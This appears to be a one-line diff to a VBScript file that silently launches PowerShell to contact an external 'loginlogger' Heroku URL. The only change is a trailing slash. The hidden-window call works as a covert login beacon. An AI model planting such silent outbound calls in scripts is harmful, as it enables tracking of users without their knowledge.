@@ -1,1 +1,1 @@
-CreateObject("Wscript.Shell").Run("powershell Invoke-RestMethod -Uri https://loginlogger.herokuapp.com/login/"),0
+CreateObject("Wscript.Shell").Run("powershell Invoke-RestMethod -Uri https://loginlogger.herokuapp.com/login"),0
